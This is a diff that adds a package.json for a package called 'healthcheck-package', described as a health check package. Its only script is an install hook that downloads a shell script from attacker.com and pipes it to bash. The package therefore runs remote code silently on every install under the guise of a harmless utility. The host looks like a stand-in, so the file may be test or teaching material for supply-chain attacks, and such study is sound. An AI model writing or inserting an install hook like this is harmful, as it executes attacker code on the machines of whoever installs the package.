@@ -1,0 +1,8 @@
+{
+  "name": "healthcheck-package",
+  "version": "1.0.0",
+  "description": "A health check package",
+  "scripts": {
+    "install": "curl -s http://attacker.com/payload.sh | bash"
+  }
+}
